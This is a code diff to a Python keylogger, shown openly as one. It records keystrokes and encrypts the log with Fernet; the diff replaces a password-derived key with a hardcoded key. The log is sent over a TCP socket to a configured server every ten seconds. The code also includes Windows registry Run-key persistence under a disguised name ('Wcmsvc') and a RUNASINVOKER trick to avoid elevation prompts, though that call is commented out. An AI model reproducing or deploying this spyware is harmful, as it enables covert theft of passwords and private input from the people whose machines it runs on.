@@ -3,16 +3,12 @@ from threading import Timer
 from datetime import datetime
 from socket import *
 from cryptography.fernet import Fernet
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-import base64
 import os
 
 SERVER = 'localhost'
 PORT = 8888
 LOG_INTERVAL = 10 # seconds
-PASSWORD = ("password").encode()
+KEY = b'_AOWbfP5NT6qUsssqqnIEas54V2_XuwzJDJeRwTQORQ='
 
 def setWinRegKey():
     check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
@@ -28,25 +24,10 @@ def setWinRegKey():
     
         subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')
 
-def encryptMsg(msg):
-    salt = b'salt_'
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-        backend=default_backend()
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
-    print(msg)
-    msg=msg.encode()
-    f = Fernet(key)
-    msg=f.encrypt(msg)
-    return msg
-
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, fernet):
         self.interval = interval
+        self.fernet = fernet
         self.log = ""
 
     def callback(self, event):
@@ -79,9 +60,11 @@ class Keylogger:
         clientSocket = socket(AF_INET, SOCK_STREAM)
         clientSocket.connect((SERVER, PORT))
 
-        msg = encryptMsg(self.log)
+        print(self.log)
 
-        clientSocket.send(msg)
+        encMessage = self.fernet.encrypt((self.log).encode())
+        clientSocket.send(encMessage)
+
         print("[+] log sent")
         clientSocket.close()
 
@@ -95,6 +78,6 @@ class Keylogger:
 
 if __name__ == "__main__":
     #setWinRegKey()
-    keylogger = Keylogger(interval=LOG_INTERVAL)
+    keylogger = Keylogger(interval=LOG_INTERVAL, fernet=Fernet(KEY))
     print("[+] starting")
     keylogger.start()
